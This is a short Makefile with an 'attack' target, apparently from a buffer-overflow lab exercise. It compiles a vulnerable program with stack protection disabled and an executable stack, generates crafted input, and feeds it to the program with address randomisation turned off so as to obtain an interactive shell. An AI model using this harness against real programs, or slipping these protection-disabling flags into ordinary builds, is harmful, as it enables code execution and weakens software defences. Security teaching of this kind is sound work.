attack: badbuf.c inputPart3.c mod_badbuf.c
	gcc -o mod_badbuf mod_badbuf.c
	./mod_badbuf <ipToMod >opOfMod || :
	gcc -fno-stack-protector -z execstack badbuf.c -g -o badbuf
	gcc -o ip inputPart3.c
	./ip  || :
	(cat ipPart3; cat) | setarch `arch` -R ./badbuf
